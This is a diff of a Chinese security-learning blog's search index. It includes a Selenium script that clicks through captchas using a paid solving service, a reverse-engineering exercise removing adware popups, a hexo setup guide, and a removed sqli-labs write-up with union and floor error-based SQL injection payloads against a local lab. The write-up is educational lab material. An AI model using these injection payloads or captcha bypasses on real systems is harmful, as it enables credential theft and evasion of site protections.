class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">    result=chaojiying.PostPic(im, <span class="number">9004</span>)[<span class="string">&#x27;pic_str&#x27;</span>]</span><br><span class="line">    <span class="comment">#print (chaojiying.PostPic(im, 9004))</span></span><br><span class="line">    all_list = []</span><br><span class="line">    chaojiying.ReportError(<span class="built_in">id</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;|&#x27;</span> <span class="keyword">in</span> result:</span><br><span class="line">        list_1 = result.split(<span class="string">&#x27;|&#x27;</span>)</span><br><span class="line">        count_1 = <span class="built_in">len</span>(list_1)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(count_1):</span><br><span class="line">            xy_list = []</span><br><span class="line">            x = <span class="built_in">int</span>(list_1[i].split(<span class="string">&#x27;,&#x27;</span>)[<span class="number">0</span>])</span><br><span class="line">            y = <span class="built_in">int</span>(list_1[i].split(<span class="string">&#x27;,&#x27;</span>)[<span class="number">1</span>])</span><br><span class="line">            xy_list.append(x)</span><br><span class="line">            xy_list.append(y)</span><br><span class="line">            all_list.append(xy_list)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        x = <span class="built_in">int</span>(result.split(<span class="string">&#x27;,&#x27;</span>)[<span class="number">0</span>])</span><br><span class="line">        y = <span class="built_in">int</span>(result.split(<span class="string">&#x27;,&#x27;</span>)[<span class="number">1</span>])</span><br><span class="line">        xy_list = []</span><br><span class="line">        xy_list.append(x)</span><br><span class="line">        xy_list.append(y)</span><br><span class="line">        all_list.append(xy_list)</span><br><span class="line">    print(all_list)</span><br><span class="line"><span class="comment"># 移动光标进行点击验证码, 动作链移动光标</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> all_list:</span><br><span class="line">        x = a[<span class="number">0</span>]-<span class="number">6</span></span><br><span class="line">        y = a[<span class="number">1</span>]-<span class="number">8</span></span><br><span class="line">        <span class="comment">#先实例化对象</span></span><br><span class="line">        action = ActionChains(bro)</span><br><span class="line">        <span class="comment"># 先把坐标原点偏移到验证码的原点  # 实例化动作链并立即执行移动操作</span></span><br><span class="line">        action.move_to_element_with_offset(code_img_ele, x, y).click().perform()</span><br><span class="line">        sleep(<span class="number">1</span>)</span><br><span class="line">    bro.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;J-login&quot;]&#x27;</span>).click()</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>编程学习</category>
-        <category>python</category>
-      </categories>
-  </entry>
-  <entry>
     <title>在kali使用代理进行隐形攻击</title>
     <url>/2021/02/10/%E5%9C%A8kali%E4%BD%BF%E7%94%A8%E4%BB%A3%E7%90%86%E8%BF%9B%E8%A1%8C%E9%9A%90%E5%BD%A2%E6%94%BB%E5%87%BB/</url>
     <content><![CDATA[<h2 id="一、下载-proxychains-ng，并安装"><a class="header-anchor" href="#一、下载-proxychains-ng，并安装">¶</a>一、下载 proxychains-ng，并安装</h2>
@@ -2835,6 +2835,50 @@ index.php</p>
       <categories>
         <category>工具</category>
         <category>kali之proxychains</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>利用hexo+github搭建blog小结</title>
+    <url>/2021/01/03/%E5%AE%89%E8%A3%85hexo%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91/</url>
+    <content><![CDATA[<p>想让后面用hexo+github搭建blog的兄弟们少走弯路</p>
+<a id="more"></a>
+<p><strong>先按照下面文章进行搭建,遇到具体问题再精确打击</strong></p>
+<p><a href="https://www.cnblogs.com/visugar/p/6821777.html">hexo从零开始到搭建完整</a></p>
+<h2 id="安装问题"><a class="header-anchor" href="#安装问题">¶</a>安装问题</h2>
+<h3 id="npm安装失败"><a class="header-anchor" href="#npm安装失败">¶</a>npm安装失败</h3>
+<p>修改npm的资源镜像链接:</p>
+<p><a href="https://blog.csdn.net/mmm654/article/details/106184630/">https://blog.csdn.net/mmm654/article/details/106184630/</a></p>
+<h3 id="ssh创建失败"><a class="header-anchor" href="#ssh创建失败">¶</a>ssh创建失败</h3>
+<p><strong>创建ssh 遇到</strong>  <code>Host Key Verification Failed</code><strong>参考下文解决</strong></p>
+<p><a href="https://blog.csdn.net/Zheng548/article/details/79079293">https://blog.csdn.net/Zheng548/article/details/79079293</a></p>
+<h2 id="绑定自己的域名"><a class="header-anchor" href="#绑定自己的域名">¶</a>绑定自己的域名</h2>
+<p>去阿里云购买一个域名，然后绑定到GitHub pages上。</p>
+<p>买好之后去域名控制台，选择解析</p>
+<p>如下图所示，记录值改为你的 <a href="http://username.github.io">username.github.io</a> ，然后确定。</p>
+<p><a href="https://imgchr.com/i/s9vgPK"><img src="https://s3.ax1x.com/2021/01/03/s9vgPK.png" alt="s9vgPK.png"></a></p>
+<p>然后在项目文件夹下面的source下面，比如E:\xxx\Blog\source ，新建一个文件 CNAME（注意是文件，不是文件夹） 然后用记事本打开，填写你的域名。比如我的，<a href="http://wh1tecell.com">wh1tecell.com</a></p>
+<p>再使用git bash部署一次即可</p>
+<h2 id="主题优化"><a class="header-anchor" href="#主题优化">¶</a>主题优化</h2>
+<h3 id="hexo-文章截断"><a class="header-anchor" href="#hexo-文章截断">¶</a>hexo 文章截断</h3>
+<p><a href="https://blog.csdn.net/fmk1023/article/details/100064488">https://blog.csdn.net/fmk1023/article/details/100064488</a></p>
+<h3 id="yilia主题增加分类"><a class="header-anchor" href="#yilia主题增加分类">¶</a>yilia主题增加分类</h3>
+<p><a href="https://blog.csdn.net/weixin_44330881/article/details/102825989">https://blog.csdn.net/weixin_44330881/article/details/102825989</a></p>
+<h3 id="利用不蒜子增加访问次数"><a class="header-anchor" href="#利用不蒜子增加访问次数">¶</a>利用不蒜子增加访问次数</h3>
+<p><a href="https://mxy493.xyz/2019/01/26/Hexo-yilia%E4%B8%BB%E9%A2%98%E6%B7%BB%E5%8A%A0%E2%80%9C%E4%B8%8D%E8%92%9C%E5%AD%90%E2%80%9D%E8%AE%BF%E9%97%AE%E9%87%8F%E7%BB%9F%E8%AE%A1/">https://mxy493.xyz/2019/01/26/Hexo-yilia主题添加“不蒜子”访问量统计/</a></p>
+<h3 id="安装Valine评论系统"><a class="header-anchor" href="#安装Valine评论系统">¶</a>安装Valine评论系统</h3>
+<p><a href="https://qinrunfa.top/archives/34257.html">https://qinrunfa.top/archives/34257.html</a></p>
+<h3 id="发现左侧-名称-和签名不显示-自行添加"><a class="header-anchor" href="#发现左侧-名称-和签名不显示-自行添加">¶</a>发现左侧 名称 和签名不显示(自行添加)</h3>
+<p><a href="https://github.com/JoeyBling/hexo-theme-yilia-plus/issues/60">https://github.com/JoeyBling/hexo-theme-yilia-plus/issues/60</a></p>
+<h3 id="制作图标icon"><a class="header-anchor" href="#制作图标icon">¶</a>制作图标icon</h3>
+<p><a href="https://www.cnblogs.com/wangyuehan/p/10033203.html">https://www.cnblogs.com/wangyuehan/p/10033203.html</a></p>
+<h3 id="hexo-g-报错及解决方案"><a class="header-anchor" href="#hexo-g-报错及解决方案">¶</a>hexo g 报错及解决方案</h3>
+<p><a href="https://blog.csdn.net/yongf2014/article/details/50016783">https://blog.csdn.net/yongf2014/article/details/50016783</a></p>
+<p><strong>还有一些版权声明，音乐播放，图片背景等等的,慢慢耍吧 加油骚年！</strong></p>
+<p><strong>美化参考</strong>:<a href="https://blog.csdn.net/weixin_41287260/article/details/97693850">https://blog.csdn.net/weixin_41287260/article/details/97693850</a></p>
+]]></content>
+      <categories>
+        <category>前端</category>
+        <category>hexo</category>
       </categories>
   </entry>
   <entry>
@@ -2912,50 +2956,6 @@ index.php</p>
       <categories>
         <category>web技术学习</category>
         <category>文件上传</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>利用hexo+github搭建blog小结</title>
-    <url>/2021/01/03/%E5%AE%89%E8%A3%85hexo%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91/</url>
-    <content><![CDATA[<p>想让后面用hexo+github搭建blog的兄弟们少走弯路</p>
-<a id="more"></a>
-<p><strong>先按照下面文章进行搭建,遇到具体问题再精确打击</strong></p>
-<p><a href="https://www.cnblogs.com/visugar/p/6821777.html">hexo从零开始到搭建完整</a></p>
-<h2 id="安装问题"><a class="header-anchor" href="#安装问题">¶</a>安装问题</h2>
-<h3 id="npm安装失败"><a class="header-anchor" href="#npm安装失败">¶</a>npm安装失败</h3>
-<p>修改npm的资源镜像链接:</p>
-<p><a href="https://blog.csdn.net/mmm654/article/details/106184630/">https://blog.csdn.net/mmm654/article/details/106184630/</a></p>
-<h3 id="ssh创建失败"><a class="header-anchor" href="#ssh创建失败">¶</a>ssh创建失败</h3>
-<p><strong>创建ssh 遇到</strong>  <code>Host Key Verification Failed</code><strong>参考下文解决</strong></p>
-<p><a href="https://blog.csdn.net/Zheng548/article/details/79079293">https://blog.csdn.net/Zheng548/article/details/79079293</a></p>
-<h2 id="绑定自己的域名"><a class="header-anchor" href="#绑定自己的域名">¶</a>绑定自己的域名</h2>
-<p>去阿里云购买一个域名，然后绑定到GitHub pages上。</p>
-<p>买好之后去域名控制台，选择解析</p>
-<p>如下图所示，记录值改为你的 <a href="http://username.github.io">username.github.io</a> ，然后确定。</p>
-<p><a href="https://imgchr.com/i/s9vgPK"><img src="https://s3.ax1x.com/2021/01/03/s9vgPK.png" alt="s9vgPK.png"></a></p>
-<p>然后在项目文件夹下面的source下面，比如E:\xxx\Blog\source ，新建一个文件 CNAME（注意是文件，不是文件夹） 然后用记事本打开，填写你的域名。比如我的，<a href="http://wh1tecell.com">wh1tecell.com</a></p>
-<p>再使用git bash部署一次即可</p>
-<h2 id="主题优化"><a class="header-anchor" href="#主题优化">¶</a>主题优化</h2>
-<h3 id="hexo-文章截断"><a class="header-anchor" href="#hexo-文章截断">¶</a>hexo 文章截断</h3>
-<p><a href="https://blog.csdn.net/fmk1023/article/details/100064488">https://blog.csdn.net/fmk1023/article/details/100064488</a></p>
-<h3 id="yilia主题增加分类"><a class="header-anchor" href="#yilia主题增加分类">¶</a>yilia主题增加分类</h3>
-<p><a href="https://blog.csdn.net/weixin_44330881/article/details/102825989">https://blog.csdn.net/weixin_44330881/article/details/102825989</a></p>
-<h3 id="利用不蒜子增加访问次数"><a class="header-anchor" href="#利用不蒜子增加访问次数">¶</a>利用不蒜子增加访问次数</h3>
-<p><a href="https://mxy493.xyz/2019/01/26/Hexo-yilia%E4%B8%BB%E9%A2%98%E6%B7%BB%E5%8A%A0%E2%80%9C%E4%B8%8D%E8%92%9C%E5%AD%90%E2%80%9D%E8%AE%BF%E9%97%AE%E9%87%8F%E7%BB%9F%E8%AE%A1/">https://mxy493.xyz/2019/01/26/Hexo-yilia主题添加“不蒜子”访问量统计/</a></p>
-<h3 id="安装Valine评论系统"><a class="header-anchor" href="#安装Valine评论系统">¶</a>安装Valine评论系统</h3>
-<p><a href="https://qinrunfa.top/archives/34257.html">https://qinrunfa.top/archives/34257.html</a></p>
-<h3 id="发现左侧-名称-和签名不显示-自行添加"><a class="header-anchor" href="#发现左侧-名称-和签名不显示-自行添加">¶</a>发现左侧 名称 和签名不显示(自行添加)</h3>
-<p><a href="https://github.com/JoeyBling/hexo-theme-yilia-plus/issues/60">https://github.com/JoeyBling/hexo-theme-yilia-plus/issues/60</a></p>
-<h3 id="制作图标icon"><a class="header-anchor" href="#制作图标icon">¶</a>制作图标icon</h3>
-<p><a href="https://www.cnblogs.com/wangyuehan/p/10033203.html">https://www.cnblogs.com/wangyuehan/p/10033203.html</a></p>
-<h3 id="hexo-g-报错及解决方案"><a class="header-anchor" href="#hexo-g-报错及解决方案">¶</a>hexo g 报错及解决方案</h3>
-<p><a href="https://blog.csdn.net/yongf2014/article/details/50016783">https://blog.csdn.net/yongf2014/article/details/50016783</a></p>
-<p><strong>还有一些版权声明，音乐播放，图片背景等等的,慢慢耍吧 加油骚年！</strong></p>
-<p><strong>美化参考</strong>:<a href="https://blog.csdn.net/weixin_41287260/article/details/97693850">https://blog.csdn.net/weixin_41287260/article/details/97693850</a></p>
-]]></content>
-      <categories>
-        <category>前端</category>
-        <category>hexo</category>
       </categories>
   </entry>
   <entry>
@@ -3131,6 +3131,56 @@ index.php</p>
       </categories>
   </entry>
   <entry>
+    <title>逆向之广告弹窗去除练习</title>
+    <url>/2021/04/15/%E9%80%86%E5%90%91%E4%B9%8B%E5%B9%BF%E5%91%8A%E5%BC%B9%E7%AA%97%E5%8E%BB%E9%99%A4%E7%BB%83%E4%B9%A0/</url>
+    <content><![CDATA[<p><strong>所需工具：</strong><br>
+1.OllyDbg 下载地址：<a href="http://down.52pojie.cn/Tools/Debuggers/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E4%B8%93%E7%94%A8%E7%89%88Ollydbg.rar">吾爱破解专用版Ollydbg.rar</a><br>
+2.C32Asm 下载地址： <a href="http://down.52pojie.cn/Tools/Disassemblers/C32Asm.rar">C32Asm.rar</a><br>
+3.ProcMon 下载地址：<a href="http://down.52pojie.cn/Tools/Anti_Rootkit/Procmon.exe">Procmon.exe</a><br>
+4.ProcExp 下载地址：<a href="http://down.52pojie.cn/Tools/Anti_Rootkit/Procexp.exe">Procexp.exe</a></p>
+<h2 id="练习一"><a class="header-anchor" href="#练习一">¶</a>练习一</h2>
+<h3 id="一-去网页弹出"><a class="header-anchor" href="#一-去网页弹出">¶</a>一:去网页弹出</h3>
+<p>弹网页我们使用<strong>C32asm</strong>去除</p>
+<p><img src="https://img-blog.csdnimg.cn/20210415175439914.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>查找后发现第一个没用</p>
+<p>第二个有 explorer字眼</p>
+<p><img src="https://img-blog.csdnimg.cn/2021041517560620.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>直接用 00填充</p>
+<p><img src="https://img-blog.csdnimg.cn/20210415175709181.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>保存下来发现弹网页的都消失了</p>
+<h3 id="二-去除弹窗"><a class="header-anchor" href="#二-去除弹窗">¶</a>二:去除弹窗</h3>
+<p><img src="https://img-blog.csdnimg.cn/20210415183716895.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>我们首先要知道一些windows的api</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.MessageBoxA&#x2F;W</span><br><span class="line">消息框</span><br><span class="line"></span><br><span class="line">2.ShellExecuteA&#x2F;W</span><br><span class="line">3.WinExec</span><br><span class="line">4.CreateProcessA&#x2F;W</span><br><span class="line">弹网页</span><br><span class="line"></span><br><span class="line">5.CreateThread</span><br><span class="line"></span><br><span class="line">6.RegCreateKeyExA&#x2F;W</span><br><span class="line">7.RegOpenKeyExA&#x2F;W</span><br><span class="line">8.RegDeleteKeyExA&#x2F;W</span><br><span class="line">注册表</span><br><span class="line"></span><br><span class="line">CreateWindowExA&#x2F;w</span><br><span class="line">DialogBoxParamA&#x2F;W</span><br><span class="line">弹窗口</span><br></pre></td></tr></table></figure>
+<p>将我们去除网页弹窗的exe拖入od</p>
+<p>发现我们的弹窗是<strong>来试试我的程序啊</strong></p>
+<p>我们智能搜索到那里 在call函数下断点 f9运行  通过右下角堆栈列表发现他有4个参数</p>
+<p>我们nop掉这4个参数和这个call函数 (注意不能只nop掉这个call函数 否则会在后面出错)</p>
+<p><img src="https://img-blog.csdnimg.cn/20210415184028494.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="练习二"><a class="header-anchor" href="#练习二">¶</a>练习二</h2>
+<p>这个程序会自动将ie主页更改为52pojie 并且过一段时间会右下角弹窗</p>
+<p>由于我的环境问题 我就不演示ie主页篡改的修复只讲讲思路</p>
+<p>将文件拉入od 智能搜索发现 篡改ie的地方 进去发现一大堆函数都是它的  我们直接将段头部 改为 retn</p>
+<p>但是要注意与段尾的retn对应 否则会出错</p>
+<p>然后解决一个弹页面的弹窗</p>
+<p>智能搜索 看到explorer字眼 直接nop就行</p>
+<p>接下来去除内置的窗口</p>
+<p><img src="https://img-blog.csdnimg.cn/20210415205101444.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>我们去除内置窗口可以使用<strong>Restorator</strong></p>
+<p><img src="https://img-blog.csdnimg.cn/20210415204922188.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>最后来讲去除右下角弹窗</p>
+<p><img src="https://img-blog.csdnimg.cn/20210415193300253.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>因为我已经知道这个广告是 dialogbox的api</p>
+<p>所以我直接  CTRL+ALT+G 搜索然后下断点</p>
+<p>在函数头直接retn 成功删除了这个广告</p>
+<p><img src="https://img-blog.csdnimg.cn/20210415203302184.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+]]></content>
+      <categories>
+        <category>逆向</category>
+        <category>windows逆向</category>
+      </categories>
+  </entry>
+  <entry>
     <title>BJDCTF 2nd之web</title>
     <url>/2021/03/25/BJDCTF-2nd%E4%B9%8Bweb/</url>
     <content><![CDATA[<h2 id="BJDCTF-2nd-简单注入"><a class="header-anchor" href="#BJDCTF-2nd-简单注入">¶</a>[BJDCTF 2nd]简单注入</h2>
@@ -3260,201 +3310,6 @@ index.php</p>
       <categories>
         <category>刷题站</category>
         <category>buuctf</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>sql-labs刷题记录</title>
-    <url>/2020/10/02/sqli%20labs%E5%88%B7%E9%A2%98%E6%89%8B%E5%86%8C/</url>
-    <content><![CDATA[<p>记录sql-labs学习</p>
-<a id="more"></a>
-<p><strong>先看一下IMformation_schema结构</strong></p>
-<p><a href="https://imgchr.com/i/B5PhcR"><img src="https://s1.ax1x.com/2020/11/07/B5PhcR.png" alt="B5PhcR.png"></a></p>
-<h2 id="Less-1（1-4联合注入）"><a class="header-anchor" href="#Less-1（1-4联合注入）">¶</a>Less-1（1-4联合注入）</h2>
-<p>小白可以先看这两篇文章</p>
-<p><a href="https://zhuanlan.zhihu.com/p/22397455">文章1</a> <a href="https://zhuanlan.zhihu.com/p/22397620">文章2</a></p>
-<p>我们先来判断注入类型。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and 1&#x3D;1 --+</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and 1&#x3D;2 --+</span><br></pre></td></tr></table></figure>
-<p>经这两者判断，第一种传入网站显示正常，第二种传入网站显示不正常。可以看出我们的语句已经被执行。因此说明是单引号类型注入。 先判断字段数。依次递增order by 后面的数值。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1&#39; order by 1 --+</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1&#39; order by 2 --+</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1&#39; order by 3 --+</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1&#39; order by 4 --+</span><br></pre></td></tr></table></figure>
-<p>发现3时不报错,而4时报错，所以字段数是3。<br>
-接下来用联合查询判断显示位。首先我们要让id变成一个不存在的值以便显示出来的值都是union语句执行的结果。在这里我们使用100。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;100&#39; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
-<p><a href="https://imgchr.com/i/B5kf3Q"><img src="images/B5kf3Q.png" alt="B5kf3Q.png"></a></p>
-<p>接下来就是常规操作</p>
-<p><code>爆库:http://127.0.0.1/sqli-labs-master/Less-1/?id=100' union select 1,2,database() --+</code></p>
-<p><code>爆表:http://127.0.0.1/sqli-labs-master/Less-1/?id=100' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+</code></p>
-<p><code>爆字段:http://127.0.0.1/sqli-labs-master/Less-1/?id=100' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users' --+</code></p>
-<p><code>爆值:http://127.0.0.1/sqli-labs-master/Less-1/?id=100' union select 1,2,group_concat(username,0x3a,password,0x3c2f62723e) from security.users --+</code></p>
-<h2 id="Less-2"><a class="header-anchor" href="#Less-2">¶</a>Less-2</h2>
-<p>这道题和上面那道其实很类似。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1 and 1&#x3D;1 --+</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1 and 1&#x3D;2 --+</span><br></pre></td></tr></table></figure>
-<p>第一种传入网站显示正常，第二种传入网站显示不正常。可以看出我们的语句已经被执行。因此说明是数值类型注入。<br>
-之后的注入类型与Less-1雷同(仅需把单引号去掉而已)。不再赘述。</p>
-<h2 id="Less-3"><a class="header-anchor" href="#Less-3">¶</a>Less-3</h2>
-<p>我们先传入id=1’,可以得到这样的报错信息。</p>
-<p><a href="https://imgchr.com/i/B5eq1S"><img src="https://s1.ax1x.com/2020/11/07/B5eq1S.png" alt="B5eq1S.png"></a></p>
-<p>分析以下句子</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">COPY&#39;&#39;1&#39;&#39;) LIMIT 0,1&#39;</span><br></pre></td></tr></table></figure>
-<p>左右两边的单引号是代表是字符串，再分析下面句子</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;1&#39;&#39;)</span><br></pre></td></tr></table></figure>
-<p>1‘ 是我们传进去的，由报错信息可知，后台的sql语句应该带有括号，并且有<code>'</code>,即<code>('$id')</code></p>
-<p>由此看出，我们需要闭合’)</p>
-<h2 id="Less-4"><a class="header-anchor" href="#Less-4">¶</a>Less-4</h2>
-<p>老样子输入 ’ 看看是否有报错</p>
-<p>发现输入 “  会有报错，分析可得 我们需要闭合 ”）</p>
-<p><a href="https://imgchr.com/i/B5QPOS"><img src="https://s1.ax1x.com/2020/11/07/B5QPOS.png" alt="B5QPOS.png"></a></p>
-<h2 id="Less-5"><a class="header-anchor" href="#Less-5">¶</a>Less-5</h2>
-<p>这题不管我们怎么输入，只有两种回显状态，<strong>我们使用floor报错注入</strong></p>
-<p><a href="https://imgchr.com/i/Bofgn1"><img src="https://s1.ax1x.com/2020/11/08/Bofgn1.png" alt="Bofgn1.png"></a></p>
-<h3 id="playload"><a class="header-anchor" href="#playload">¶</a>playload:</h3>
-<p><code>爆库:http://127.0.0.1/sqli-labs-master/Less-5/?id=1' and (select 1 from (select count(*),concat((database()),floor (rand(0)*2))x from information_schema.tables group by x)a)--+</code></p>
-<p><code>爆表:http://127.0.0.1/sqli-labs-master/Less-5/?id=1' and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=database()),floor (rand(0)*2))x from information_schema.tables group by x)a)--+</code></p>
-<p><a href="https://imgchr.com/i/Bo5hNV"><img src="https://s1.ax1x.com/2020/11/08/Bo5hNV.png" alt="Bo5hNV.png"></a></p>
-<p>这里发现页面提示我输出信息超过一行，所以我们要采用limit语句来控制输出。</p>
-<p>根据limit不断递增即可得到全部值。</p>
-<p><code>爆字段:http://127.0.0.1/sqli-labs-master/Less-5/?id=1' and (select 1 from (select count(*),concat((select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema=database()limit 0,1 ),floor (rand(0)*2))x from information_schema.tables group by x)a)--+</code></p>
-<h3 id="floor报错注入"><a class="header-anchor" href="#floor报错注入">¶</a>floor报错注入</h3>
-<ul>
-<li>floor () 报错原理</li>
-</ul>
-<p>研究了一下午，总算是把这个原理搞懂了。<br>
-利用 floor () 函数使 SQL 语句报错，实际上是由 rand () ， count () ， group by 三个函数语句联合使用造成的。<br>
-首先，看一下语句中使用到的函数和子句：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. concat： 连接字符串功能</span><br><span class="line">2. floor： 取float的整数值(向下取整）</span><br><span class="line">3. rand： 取0~1之间的随机浮点值</span><br><span class="line">4. group by： 根据一个或多个列对结果集进行分组并有排序功能</span><br><span class="line">5. floor(rand(0)*2)： 随机产生0或1</span><br></pre></td></tr></table></figure>
-<p>刚才已经说了 利用 floor () 的报错注入实际上是由 rand () ， count () ， group by 三个函数语句联合使用造成的，想要搞清楚原理我们首先来分析单个，<br>
-从 group by 子句开始，<br>
-这里我建了一个 person 表测试：<br>
-<img src="http://www.aiyuanzhen.com/usr/uploads/2019/05/2915214011.png" alt="2.png">我们通过 page 年龄这个字段来对表中数据分组：<img src="http://www.aiyuanzhen.com/usr/uploads/2019/05/916623330.png" alt="3.png">可以看到我们出现了一个新的数据表，有 page 、 count (<em>) 这两个字段，count (</em>) 字段下表示每个年龄人的数量，可以联想到 group by 子句的执行流程，最初时，page-count (<em>) 这个数据表是空的，通过一行一行读原数据表中的 page 字段，如果读到的 page 在 page-count (</em>) 数据表中不存在，就将它插入，并且将对应的 count (<em>) 赋为 1，如果存在，就将其对应的 count (</em>) +1，直至扫完整个数据表。</p>
-<blockquote>
-<p>Tips：这里有一点需要注意， group by 后跟的字段名是作为虚拟表的主键，主键不能重复，这也是报错的关键点。</p>
-</blockquote>
-<p>报错的主要原因是虚拟表的主键重复，那我们来看一下是哪里，在什么情景下重复了。<br>
-这时候用到 rand () 函数了，继续来了解 rand () 函数的用法：</p>
-<ol>
-<li>生成 0~1 之间的随机浮点值</li>
-<li>可以给 rand () 传一个参数作为 rand () 的种子，然后 rand 函数会依据这个种子进行随机生成</li>
-</ol>
-<p>这里加上 floor () 函数的用法：</p>
-<ol>
-<li>floor： 取 float 的整数值 (向下取整）</li>
-</ol>
-<p>所以，floor (rand ()*2) 和 floor (rand (0)*2) 表示产生 0 或者 1。<br>
-我们来比较下它们的区别：<br>
-<img src="http://www.aiyuanzhen.com/usr/uploads/2019/05/1346366380.png" alt="4.png"><img src="http://www.aiyuanzhen.com/usr/uploads/2019/05/1683359691.png" alt="5.png">可以看得出来  **floor (rand (0)*2)**是有规律的 。</p>
-<p><strong>报错原因解析</strong></p>
-<p>通过 floor 报错的方法来爆数据的本质是 group by 语句的报错。group by 语句报错的原因</p>
-<p>是 floor(random(0)*2)的不确定性，即可能为 0 也可能为 1</p>
-<p>group by key 执行时循环读取数据的每一行，将结果保存于临时表中。读取每一行的 key 时，</p>
-<p>如果 key 存在于临时表中，则更新临时表中的数据（更新数据时，不再计算 rand 值）；如果</p>
-<p>该 key 不存在于临时表中，则在临时表中插入 key 所在行的数据。（插入数据时，会再计算</p>
-<p>rand 值）</p>
-<p>如果此时临时表只有 key 为 1 的行不存在 key 为 0 的行，那么数据库要将该条记录插入临</p>
-<p>时表，由于是随机数，插时又要计算一下随机值，此时 floor(random(0)*2)结果可能为 1，就</p>
-<p>会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值</p>
-<p>实际测试中发现，出现报错，至少要求数据记录为 3 行，记录数超过 3 行一定会报错，2 行</p>
-<p>时是不报错的。</p>
-<blockquote>
-<p>Tips: 综上所述，当数据表记录大于三时，使用 group by floor (rand (0)<em>2) 一定报错。</em></p>
-<p>*在测试过程中，发现 rand(14)*2只需要两条数据就能报错。但如果from的表中只有一条数据的话floor()报错注入就没法用了，毕竟是重复，只插入一条数据怎么主键重复，对吧。</p>
-</blockquote>
